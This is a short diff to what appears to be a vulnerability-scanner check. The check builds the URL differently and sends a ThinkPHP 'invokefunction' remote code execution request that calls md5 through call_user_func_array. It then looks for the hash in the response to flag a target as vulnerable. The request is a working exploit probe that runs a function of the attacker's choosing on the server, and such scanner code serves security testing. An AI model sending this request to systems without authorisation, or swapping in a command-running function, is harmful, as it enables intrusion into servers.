@@ -18,8 +18,7 @@ def run(url, timeout):
         'payload': None
     }
     try:
-        payload = urllib.parse.urljoin(url,
-                                       r'/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=1')
+        payload = url + r'/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=1'
         response = requests.get(payload, timeout=3, verify=False)
         if re.search(r'c4ca4238a0b923820dcc509a6f75849b', response.text):
             result['vulnerable'] = True
